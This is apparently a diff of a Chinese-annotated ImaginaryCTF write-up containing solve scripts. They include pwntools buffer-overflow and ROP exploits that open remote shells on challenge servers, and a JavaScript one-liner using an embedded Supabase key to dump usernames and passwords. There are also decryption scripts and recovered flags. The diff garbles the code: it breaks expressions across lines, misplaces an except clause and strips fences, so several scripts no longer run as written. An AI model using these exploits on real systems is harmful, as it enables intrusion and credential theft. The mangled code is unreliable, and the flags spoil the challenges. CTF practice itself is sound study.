@@ -169,7 +169,8 @@ imaginary-notes
 
 js有anon key和Supabase UR，直接查询users表
 
-(async()=>{const{createClient}=await import("https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm");const s=createClient("https://dpyxnwiuwzahkxuxrojp.supabase.co","eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI");console.log(await s.from("users").select("username,password"));})();
+(async()=>{const{createClient}=await import("https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm");
+const s=createClient("https://dpyxnwiuwzahkxuxrojp.supabase.co","eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI");console.log(await s.from("users").select("username,password"));})();
 
 certificate
 
@@ -235,9 +236,21 @@ from hashlib import sha256
 #         print(print(i,io.recv()))
 #     else:
 #         io.recv()
-m=64416475091716761692127065389812664612883821582591868994255743494545506675773735408721803166930029973983156578906465037477870062272357725192966823066525475496908898190713767869944430829242616317686333351677545740313689764845810633864336858299105462505138965533921130056219286941873561437748203263071361226008
-n=123523209115700070294981644790732507503241942394429660136286979085225539225766918094934084003208926365019794286807900970816082816805556312818180615326649781915503786367730476966518584795526802784277073173160764347448395548851236780509226531914660480359338947359987945086356147300832747042633158994277007963171
-c=120556973610037647045631630603117690400204857398547796880632998178170164895802830966746983439988532372658807195415563963889101999001415501102869032382253975872835427817309277074087228787460070474098302761376812778112225868877978964444703058764270898908786813264849059600935509586945017063271188912710680388201
+m=64416475091716761692127065389812664612883821582591868994255743494545506675
+7737354087218031669300299739831565789064650374778700622723577251929668230665
+2547549690889819071376786994443082924261631768633335167754574031368976484581
+0633864336858299105462505138965533921130056219286941873561437748203263071361
+226008
+n=12352320911570007029498164479073250750324194239442966013628697908522553922
+5766918094934084003208926365019794286807900970816082816805556312818180615326
+6497819155037863677304769665185847955268027842770731731607643474483955488512
+3678050922653191466048035933894735998794508635614730083274704263315899427700
+7963171
+c=12055697361003764704563163060311769040020485739854779688063299817817016489
+5802830966746983439988532372658807195415563963889101999001415501102869032382
+2539758728354278173092770740872287874600704740983027613768127781122258688779
+7896444470305876427089890878681326484905960093550958694501706327118891271068
+0388201
 iv=0xb17c27e8915a32ed257f093a293f39ab
 ct=0x0639466fc8d94dd2b3b5737f62148951c2c480cda262d2cf3465ab7bbd68381bff592878e9825f380d48743b2362d43f0d13bc679a1447c80c49f8dee09e3ff63b48ff423ac2d7c57fe930a75be69e71
 key = sha256(str(m).encode()).digest()[:16]
@@ -262,7 +275,8 @@ def try_even_ascii(s):
             for l2 in range(1,4):
                 v1v3_len = l1 + l2
                 if len(s) < v1v3_len + len(ii_str): continue
-                v1v3 = s[:v1v3_len]; rest = s[v1v3_len:]
+                v1v3 = s[:
+v1v3_len]; rest = s[v1v3_len:]
                 ifnot rest.startswith(ii_str): continue
                 tail = rest[len(ii_str):]
                 if tail == v1v3[::-1]:
@@ -319,14 +333,16 @@ enc = bytes([
     0xD9,0x0A
 ])
 
-seed = 322376503# main 中的参数
+seed = 322376503
+# main 中的参数
 
 def keystream(seed, length):
     """模拟 keystream__nimrod_20"""
     n = seed
     ks = bytearray()
     for _ in range(length):
-        n = (1664525 * n + 1013904223) & 0xFFFFFFFF# 32位溢出
+        n = (1664525 * n + 1013904223) & 0xFFFFFFFF
+# 32位溢出
         ks.append((n >> 16) & 0xFF)  # BYTE2
     return ks
 
@@ -360,7 +376,8 @@ def reverseTransformFlag(transformed_flag):
                     orig_pos = reverse_func(i, pos)
                     result.append(set_str[orig_pos])
                     break
-                except StopIteration:
+                
+except StopIteration:
                     result.append(set_str[0])
         else:
             result.append(char)
@@ -475,7 +492,31 @@ icft{1n54n3_5k1ll2}
 questionably
 
 四个进程合作计算的结果：
-35 0F EC D2 90 4E 8D 54 43 61 C2 EC 39 B1 58 D4 D6 CF 5D 94 E5 F5 D5 0C 85 E4 92 67 5A 31 47 51 07 67 D2 4E E4 0E D5 5B 9E 46 FE 83 23 09 0E A8 88 97 EF 9C 3B 74 DC EF 0B 21 6E 94 99 84 94 CF 22 19 51 BA 53 D5 C4 A0 C7 F5 5A 21 2D 94 78 E4 E2 9E 34 CC C5 C3 F2 67 13 2B 47 5B E3 12 E1 B4 D7 E1 A1 E1 66 94 30 5C 38 3E 2C 99 85 D7 2C 96 24 93 95 1D 6C 36 CB 4F 95 49 61 27 07 F2 12 15 82 5F A5 13 AA 84 26 16 F5 05 5E A9 8B 3D EE E3 80 33 AF BC 94 B1 BF D8 2A 4F B6 60 F0 73 24 A6 89 78 68 5F 2F 42 24 54 76 35 AC 35 A1 4E 5F 50 AB AD C0 F6 0D B6 81 66 B4 66 79 D8 8D 4C 31 45 F7 48 D3 5E BD AE 65 5F 12 C0 43 34 41 41 66 1C 1D 59 C5 59 BE 76 6B A6 87 13 31 43 93 91 B8 41 88 42 4E 79 1C E2 87 E1 50 01 EF C6 71 09 15 3D 91 8A 45 FB 2B DF D0 E9 AA B0 5C EC F0 C7 5C AB 38 DE 53 07 6B 50 18 F0 C1 BE EA 61 F6 AE 4D 33 63 C2 65 45 D0 E4 5E 2D 47 6D C8 6E 63 58 C8 D2 E9 4F 5F 03 0F D4 27 80 45 C0 10 67 A1 91 D1 B4 02 E5 28 85 78 39 E2 F6 D5 DD 8F E7 E4 0E 6D 6D 0C 29 B3 4F AC 11 86 20 80 49 3E 50 89 BE B7 BA D2 13 6B FD FB FC 22 80 88 60 9E A0 75 BA 4F E1 12 B9 DF 71 79 94 45 28 11 B2 2C 49 9C 1A 2F 21 DC D1 CE 8B 7C 1B 42 37 2F 6C 8E 80 79 11 90 3A 79 23 D7 22 6E CB FD 2E AC 58 A3 FB 26 89 CC B5 09 CD 6F B4 17 E0 37 FD 9F DC AC C7 9C F0 30 C4 CA BE 19 63 B8 C6 45 98 51 17 4A 26 CF 49 87 87 45 2D 72 31 C1 3F 38 8F 52 18 0D A1 BB 6C 99 B4 5E 61 CE C9 56 42 90 53 08 8E 28 8E 06 E6 44 77 70 E9 BA AF 58 25 F5 5D EC 31 AE DE 4C F6 45 DD 06 3F D6 08 B0 19 92 EC D6 6D AD 88 FF 6C 36 F5 BD 1B D3 C4 EF 77 55 0F D7 B2 9C 5A D3 15 E3 88 03 68 C3 EA 30 04 89 BA A5 66 33 D3 3A DA 77 26 A4 01 1E 4A A7 22 08 35 7F D8 3E 09 9C 50 C0 D6 6B B7 6B CF F2 24 38 5F 3D DC C8 A6 69 76 77 BC A6 44 39 FC 99 75 60 C7 FC D2 FF 4B D5 F3 50 F0 E1 72 76 82 35 E1 F4 B5 6C EF 0A 84 99 B5 73 EE 28 DB 1E 75 FF 31 6B 32 B2 A2 AC 33 44 AF 5A 54 55 33 89 4D 0B AC 32 AE CF 67 65 17 CB 87 B4 27 99 85 4B 48 E6 ED AD 43 3E 0D AD B5 EB B6 72 EF 60 75 6C A2 50 D1 FB D6 E7 8F 9C EA CD 04 C0 96 B8 42 11 D1 5E 6D C4 48 A9 A0 2C 76 0A 18 6A 9D 3C 89 EB 3F 09 1D C9 20 5C 94 BD 58 4B AC A1 37 21 61 B7 2E 7E B2 A9 56 31 89 4D 3B D0 E3 87 BF 9B A9 35 D4 76 2D A7 85 75 93 8C EF F6 61 5D C6 71 C4 1F 1E A9 63 20 DE 30 9C C8 B3 36 83 A9 85 5B 8D 08 80 EA E6 34 0E 28 F4 2C 51 04 3D C6 A4 30 14 33 88 3F 49 9A A6 14 95 08 FE C7 E0 B2 5A A1 ED 8D 3A 82 F5 73 DD 18 D6 DD 4F C2 D2 AA 35 51 51 51 51 51 51 51 51 51 51 51 51 51 51 51 51
+350FECD2904E8D544361C2EC39B158D4D6CF5D94E5F5D50C85E492675A314751
+0767D24EE40ED55B9E46FE8323090EA88897EF9C3B74DCEF0B216E94998494CF
+221951BA53D5C4A0C7F55A212D9478E4E29E34CCC5C3F267132B475BE312E1B4
+D7E1A1E16694305C383E2C9985D72C962493951D6C36CB4F9549612707F21215
+825FA513AA842616F5055EA98B3DEEE38033AFBC94B1BFD82A4FB660F07324A6
+8978685F2F4224547635AC35A14E5F50ABADC0F60DB68166B46679D88D4C3145
+F748D35EBDAE655F12C043344141661C1D59C559BE766BA6871331439391B841
+88424E791CE287E15001EFC67109153D918A45FB2BDFD0E9AAB05CECF0C75CAB
+38DE53076B5018F0C1BEEA61F6AE4D3363C26545D0E45E2D476DC86E6358C8D2
+E94F5F030FD4278045C01067A191D1B402E528857839E2F6D5DD8FE7E40E6D6D
+0C29B34FAC11862080493E5089BEB7BAD2136BFDFBFC228088609EA075BA4FE1
+12B9DF717994452811B22C499C1A2F21DCD1CE8B7C1B42372F6C8E807911903A
+7923D7226ECBFD2EAC58A3FB2689CCB509CD6FB417E037FD9FDCACC79CF030C4
+CABE1963B8C6459851174A26CF498787452D7231C13F388F52180DA1BB6C99B4
+5E61CEC956429053088E288E06E6447770E9BAAF5825F55DEC31AEDE4CF645DD
+063FD608B01992ECD66DAD88FF6C36F5BD1BD3C4EF77550FD7B29C5AD315E388
+0368C3EA300489BAA56633D33ADA7726A4011E4AA72208357FD83E099C50C0D6
+6BB76BCFF224385F3DDCC8A6697677BCA64439FC997560C7FCD2FF4BD5F350F0
+E172768235E1F4B56CEF0A8499B573EE28DB1E75FF316B32B2A2AC3344AF5A54
+5533894D0BAC32AECF676517CB87B42799854B48E6EDAD433E0DADB5EBB672EF
+60756CA250D1FBD6E78F9CEACD04C096B84211D15E6DC448A9A02C760A186A9D
+3C89EB3F091DC9205C94BD584BACA1372161B72E7EB2A95631894D3BD0E387BF
+9BA935D4762DA78575938CEFF6615DC671C41F1EA96320DE309CC8B33683A985
+5B8D0880EAE6340E28F42C51043DC6A4301433883F499AA6149508FEC7E0B25A
+A1ED8D3A82F573DD18D6DD4FC2D2AA3551515151515151515151515151515151
 
 Misc
 
@@ -508,7 +549,7 @@ p = ELF("./vuln")
 
 libc   = ELF("/home/who4mi/ctf/challenge/imaginaryctf/babybof/libc.so.6")
 ld     = ELF("/home/who4mi/ctf/challenge/imaginaryctf/babybof/ld-linux-x86-64.so.2")
-#p     = process(argv=[ld.path,"./vuln"],env={"LD_PRELOAD" : libc.path})
+    #p     = process(argv=[ld.path,"./vuln"],env={"LD_PRELOAD" : libc.path})
 p=remote("babybof.chal.imaginaryctf.org", 1337)
 p.recvuntil("system @ ")
 system_addr_str = p.readline().strip()  
@@ -545,11 +586,6 @@ log.success("canary addr:"+hex(canary))
 payload=b"A"*0x38+p64(canary)+p64(pop_rdi_ret)+p64(pop_rdi_ret)+p64(binsh)+p64(ret)+p64(system_addr)
 p.sendline(payload)
 p.interactive()
-```
-
-
-
-```
 from pwn import *
 context.log_level="debug"
 
@@ -557,7 +593,7 @@ p = ELF("./vuln")
 
 libc   = ELF("/home/who4mi/ctf/challenge/imaginaryctf/babybof/libc.so.6")
 ld     = ELF("/home/who4mi/ctf/challenge/imaginaryctf/babybof/ld-linux-x86-64.so.2")
-#p     = process(argv=[ld.path,"./vuln"],env={"LD_PRELOAD" : libc.path})
+    #p     = process(argv=[ld.path,"./vuln"],env={"LD_PRELOAD" : libc.path})
 p=remote("addition.chal.imaginaryctf.org", 1337)
 atoll_offset=libc.symbols['atoll']
 system_offset=libc.symbols['system']
@@ -573,13 +609,8 @@ p.sendline(str(patch_value))
 p.recvuntil("add where? ")
 p.sendline("/bin/sh")
 p.interactive()
-```
-
-
-
-```
 from pwn import *
-#p=process("./vuln")
+    #p=process("./vuln")
 p=remote("cascade.chal.imaginaryctf.org",1337)
 elf=ELF("./vuln")
 libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
@@ -608,17 +639,12 @@ p.send(payload6)
 pause()
 
 payload7=b'x00'*0x48+p64(0)+p64(0x4011C9)+p64(0x404890+0x20)+p64(0x40115E)
-#gdb.attach(p)
+    #gdb.attach(p)
 p.send(payload7)
 pause()
 p.send(b'x00'*0x48+p64(0x4011C9)+p64(0x404850)+p64(0x401179))
 pause()
 p.interactive()
-```
-
-
-
-```
 from pwn import *
 context(os='linux', arch='amd64', log_level='debug')
 context.binary = elf = ELF("./vuln")
@@ -651,20 +677,11 @@ p.sendline(hex(0x404000))  
 p.recvuntil("where? ")
 p.sendline(hex(xor_secrt))  
 payload=b"A"*0x4f8+p64(pop_rdi_ret)+p64(bin_sh_addr)+p64(system_addr)
-#payload=b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaan"
+    #payload=b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaan"
 p.sendline(payload)
 p.interactive()
-```
-
-
-
-```
-(async()=>{const{createClient}=await import("https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm");const s=createClient("https://dpyxnwiuwzahkxuxrojp.supabase.co","eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI");console.log(await s.from("users").select("username,password"));})();
-```
-
-
-
-```
+(async()=>{const{createClient}=await import("https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm");
+const s=createClient("https://dpyxnwiuwzahkxuxrojp.supabase.co","eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI");console.log(await s.from("users").select("username,password"));})();
 (()=>{
 const svg = buildCertificateSVG({
     participant: "Eth007",
@@ -685,11 +702,6 @@ document.body.appendChild(a);
   a.remove();
   setTimeout(()=>URL.revokeObjectURL(a.href), 1000);
 })();
-```
-
-
-
-```
 from itertools import cycle
 
 ct_hex = (
@@ -706,11 +718,6 @@ print("Ciphertext:", ciphertext.hex())
 print("Key:", key.hex())
 print("Plaintext:", plaintext.decode())
 # Plaintext: ictf{xor_is_bad_bad_encryption}
-```
-
-
-
-```
 from pwn import *
 from tqdm import *
 import json
@@ -727,20 +734,27 @@ from hashlib import sha256
 #         print(print(i,io.recv()))
 #     else:
 #         io.recv()
-m=64416475091716761692127065389812664612883821582591868994255743494545506675773735408721803166930029973983156578906465037477870062272357725192966823066525475496908898190713767869944430829242616317686333351677545740313689764845810633864336858299105462505138965533921130056219286941873561437748203263071361226008
-n=123523209115700070294981644790732507503241942394429660136286979085225539225766918094934084003208926365019794286807900970816082816805556312818180615326649781915503786367730476966518584795526802784277073173160764347448395548851236780509226531914660480359338947359987945086356147300832747042633158994277007963171
-c=120556973610037647045631630603117690400204857398547796880632998178170164895802830966746983439988532372658807195415563963889101999001415501102869032382253975872835427817309277074087228787460070474098302761376812778112225868877978964444703058764270898908786813264849059600935509586945017063271188912710680388201
+m=64416475091716761692127065389812664612883821582591868994255743494545506675
+7737354087218031669300299739831565789064650374778700622723577251929668230665
+2547549690889819071376786994443082924261631768633335167754574031368976484581
+0633864336858299105462505138965533921130056219286941873561437748203263071361
+226008
+n=12352320911570007029498164479073250750324194239442966013628697908522553922
+5766918094934084003208926365019794286807900970816082816805556312818180615326
+6497819155037863677304769665185847955268027842770731731607643474483955488512
+3678050922653191466048035933894735998794508635614730083274704263315899427700
+7963171
+c=12055697361003764704563163060311769040020485739854779688063299817817016489
+5802830966746983439988532372658807195415563963889101999001415501102869032382
+2539758728354278173092770740872287874600704740983027613768127781122258688779
+7896444470305876427089890878681326484905960093550958694501706327118891271068
+0388201
 iv=0xb17c27e8915a32ed257f093a293f39ab
 ct=0x0639466fc8d94dd2b3b5737f62148951c2c480cda262d2cf3465ab7bbd68381bff592878e9825f380d48743b2362d43f0d13bc679a1447c80c49f8dee09e3ff63b48ff423ac2d7c57fe930a75be69e71
 key = sha256(str(m).encode()).digest()[:16]
 aes=AES.new(key, AES.MODE_CBC, IV=long_to_bytes(iv))
 print(aes.decrypt(long_to_bytes(ct)))
-#ictf{p13cin9_7h3_b1t5_t0g37her_3f0068c1b9be2547ada52a8020420fb0}
-```
-
-
-
-```
+    #ictf{p13cin9_7h3_b1t5_t0g37her_3f0068c1b9be2547ada52a8020420fb0}
 outputs = [
 "9548128459","491095","1014813","561097","10211614611201","5748108475",
 "1171123","516484615","114959","649969946","1051160611501","991021",
@@ -754,7 +768,8 @@ def try_even_ascii(s):
             for l2 in range(1,4):
                 v1v3_len = l1 + l2
                 if len(s) < v1v3_len + len(ii_str): continue
-                v1v3 = s[:v1v3_len]; rest = s[v1v3_len:]
+                v1v3 = s[:
+v1v3_len]; rest = s[v1v3_len:]
                 ifnot rest.startswith(ii_str): continue
                 tail = rest[len(ii_str):]
                 if tail == v1v3[::-1]:
@@ -800,11 +815,6 @@ flag = "".join(chr(a)+chr(b) for i,(a,b) in sorted(tuples.items(), key=lamb
 print(flag)
 
 ictf{cu3st0m_c0mp@r@t0rs_1e8f9e}
-```
-
-
-
-```
 enc = bytes([
     0x28,0xF8,0x3E,0xE6,0x3E,0x2F,0x43,0x0C,
     0xB9,0x96,0xD1,0x5C,0xD6,0xBF,0x36,0xD8,
@@ -813,14 +823,16 @@ enc = bytes([
     0xD9,0x0A
 ])
 
-seed = 322376503# main 中的参数
+seed = 322376503
+# main 中的参数
 
 def keystream(seed, length):
     """模拟 keystream__nimrod_20"""
     n = seed
     ks = bytearray()
     for _ in range(length):
-        n = (1664525 * n + 1013904223) & 0xFFFFFFFF# 32位溢出
+        n = (1664525 * n + 1013904223) & 0xFFFFFFFF
+# 32位溢出
         ks.append((n >> 16) & 0xFF)  # BYTE2
     return ks
 
@@ -834,11 +846,6 @@ plain = xor_decrypt(enc, seed)
 print("Decrypted:", ''.join(chr(x) if32 <= x <= 126else'.'for x in plain))
 
 ictf{a_mighty_hunter_bfc16cce9dc8}
-```
-
-
-
-```
 def reverseTransformFlag(transformed_flag):
 
     char_sets = [
@@ -856,7 +863,8 @@ def reverseTransformFlag(transformed_flag):
                     orig_pos = reverse_func(i, pos)
                     result.append(set_str[orig_pos])
                     break
-                except StopIteration:
+                
+except StopIteration:
                     result.append(set_str[0])
         else:
             result.append(char)
@@ -869,11 +877,6 @@ if __name__ == "__main__":
     print(f"Original flag: {original_string}")
 
 ictf{1_l0v3_@ndr0id_stud103}
-```
-
-
-
-```
 def reverse_off(x):
 
     return x - 15
@@ -969,13 +972,32 @@ data2=reverse_eor(data2)
 print(chr(data2))
 
 icft{1n54n3_5k1ll2}
-```
-
-
-
-```
 四个进程合作计算的结果：
-35 0F EC D2 90 4E 8D 54 43 61 C2 EC 39 B1 58 D4 D6 CF 5D 94 E5 F5 D5 0C 85 E4 92 67 5A 31 47 51 07 67 D2 4E E4 0E D5 5B 9E 46 FE 83 23 09 0E A8 88 97 EF 9C 3B 74 DC EF 0B 21 6E 94 99 84 94 CF 22 19 51 BA 53 D5 C4 A0 C7 F5 5A 21 2D 94 78 E4 E2 9E 34 CC C5 C3 F2 67 13 2B 47 5B E3 12 E1 B4 D7 E1 A1 E1 66 94 30 5C 38 3E 2C 99 85 D7 2C 96 24 93 95 1D 6C 36 CB 4F 95 49 61 27 07 F2 12 15 82 5F A5 13 AA 84 26 16 F5 05 5E A9 8B 3D EE E3 80 33 AF BC 94 B1 BF D8 2A 4F B6 60 F0 73 24 A6 89 78 68 5F 2F 42 24 54 76 35 AC 35 A1 4E 5F 50 AB AD C0 F6 0D B6 81 66 B4 66 79 D8 8D 4C 31 45 F7 48 D3 5E BD AE 65 5F 12 C0 43 34 41 41 66 1C 1D 59 C5 59 BE 76 6B A6 87 13 31 43 93 91 B8 41 88 42 4E 79 1C E2 87 E1 50 01 EF C6 71 09 15 3D 91 8A 45 FB 2B DF D0 E9 AA B0 5C EC F0 C7 5C AB 38 DE 53 07 6B 50 18 F0 C1 BE EA 61 F6 AE 4D 33 63 C2 65 45 D0 E4 5E 2D 47 6D C8 6E 63 58 C8 D2 E9 4F 5F 03 0F D4 27 80 45 C0 10 67 A1 91 D1 B4 02 E5 28 85 78 39 E2 F6 D5 DD 8F E7 E4 0E 6D 6D 0C 29 B3 4F AC 11 86 20 80 49 3E 50 89 BE B7 BA D2 13 6B FD FB FC 22 80 88 60 9E A0 75 BA 4F E1 12 B9 DF 71 79 94 45 28 11 B2 2C 49 9C 1A 2F 21 DC D1 CE 8B 7C 1B 42 37 2F 6C 8E 80 79 11 90 3A 79 23 D7 22 6E CB FD 2E AC 58 A3 FB 26 89 CC B5 09 CD 6F B4 17 E0 37 FD 9F DC AC C7 9C F0 30 C4 CA BE 19 63 B8 C6 45 98 51 17 4A 26 CF 49 87 87 45 2D 72 31 C1 3F 38 8F 52 18 0D A1 BB 6C 99 B4 5E 61 CE C9 56 42 90 53 08 8E 28 8E 06 E6 44 77 70 E9 BA AF 58 25 F5 5D EC 31 AE DE 4C F6 45 DD 06 3F D6 08 B0 19 92 EC D6 6D AD 88 FF 6C 36 F5 BD 1B D3 C4 EF 77 55 0F D7 B2 9C 5A D3 15 E3 88 03 68 C3 EA 30 04 89 BA A5 66 33 D3 3A DA 77 26 A4 01 1E 4A A7 22 08 35 7F D8 3E 09 9C 50 C0 D6 6B B7 6B CF F2 24 38 5F 3D DC C8 A6 69 76 77 BC A6 44 39 FC 99 75 60 C7 FC D2 FF 4B D5 F3 50 F0 E1 72 76 82 35 E1 F4 B5 6C EF 0A 84 99 B5 73 EE 28 DB 1E 75 FF 31 6B 32 B2 A2 AC 33 44 AF 5A 54 55 33 89 4D 0B AC 32 AE CF 67 65 17 CB 87 B4 27 99 85 4B 48 E6 ED AD 43 3E 0D AD B5 EB B6 72 EF 60 75 6C A2 50 D1 FB D6 E7 8F 9C EA CD 04 C0 96 B8 42 11 D1 5E 6D C4 48 A9 A0 2C 76 0A 18 6A 9D 3C 89 EB 3F 09 1D C9 20 5C 94 BD 58 4B AC A1 37 21 61 B7 2E 7E B2 A9 56 31 89 4D 3B D0 E3 87 BF 9B A9 35 D4 76 2D A7 85 75 93 8C EF F6 61 5D C6 71 C4 1F 1E A9 63 20 DE 30 9C C8 B3 36 83 A9 85 5B 8D 08 80 EA E6 34 0E 28 F4 2C 51 04 3D C6 A4 30 14 33 88 3F 49 9A A6 14 95 08 FE C7 E0 B2 5A A1 ED 8D 3A 82 F5 73 DD 18 D6 DD 4F C2 D2 AA 35 51 51 51 51 51 51 51 51 51 51 51 51 51 51 51 51
+350FECD2904E8D544361C2EC39B158D4D6CF5D94E5F5D50C85E492675A314751
+0767D24EE40ED55B9E46FE8323090EA88897EF9C3B74DCEF0B216E94998494CF
+221951BA53D5C4A0C7F55A212D9478E4E29E34CCC5C3F267132B475BE312E1B4
+D7E1A1E16694305C383E2C9985D72C962493951D6C36CB4F9549612707F21215
+825FA513AA842616F5055EA98B3DEEE38033AFBC94B1BFD82A4FB660F07324A6
+8978685F2F4224547635AC35A14E5F50ABADC0F60DB68166B46679D88D4C3145
+F748D35EBDAE655F12C043344141661C1D59C559BE766BA6871331439391B841
+88424E791CE287E15001EFC67109153D918A45FB2BDFD0E9AAB05CECF0C75CAB
+38DE53076B5018F0C1BEEA61F6AE4D3363C26545D0E45E2D476DC86E6358C8D2
+E94F5F030FD4278045C01067A191D1B402E528857839E2F6D5DD8FE7E40E6D6D
+0C29B34FAC11862080493E5089BEB7BAD2136BFDFBFC228088609EA075BA4FE1
+12B9DF717994452811B22C499C1A2F21DCD1CE8B7C1B42372F6C8E807911903A
+7923D7226ECBFD2EAC58A3FB2689CCB509CD6FB417E037FD9FDCACC79CF030C4
+CABE1963B8C6459851174A26CF498787452D7231C13F388F52180DA1BB6C99B4
+5E61CEC956429053088E288E06E6447770E9BAAF5825F55DEC31AEDE4CF645DD
+063FD608B01992ECD66DAD88FF6C36F5BD1BD3C4EF77550FD7B29C5AD315E388
+0368C3EA300489BAA56633D33ADA7726A4011E4AA72208357FD83E099C50C0D6
+6BB76BCFF224385F3DDCC8A6697677BCA64439FC997560C7FCD2FF4BD5F350F0
+E172768235E1F4B56CEF0A8499B573EE28DB1E75FF316B32B2A2AC3344AF5A54
+5533894D0BAC32AECF676517CB87B42799854B48E6EDAD433E0DADB5EBB672EF
+60756CA250D1FBD6E78F9CEACD04C096B84211D15E6DC448A9A02C760A186A9D
+3C89EB3F091DC9205C94BD584BACA1372161B72E7EB2A95631894D3BD0E387BF
+9BA935D4762DA78575938CEFF6615DC671C41F1EA96320DE309CC8B33683A985
+5B8D0880EAE6340E28F42C51043DC6A4301433883F499AA6149508FEC7E0B25A
+A1ED8D3A82F573DD18D6DD4FC2D2AA3551515151515151515151515151515151
 ```
 
 
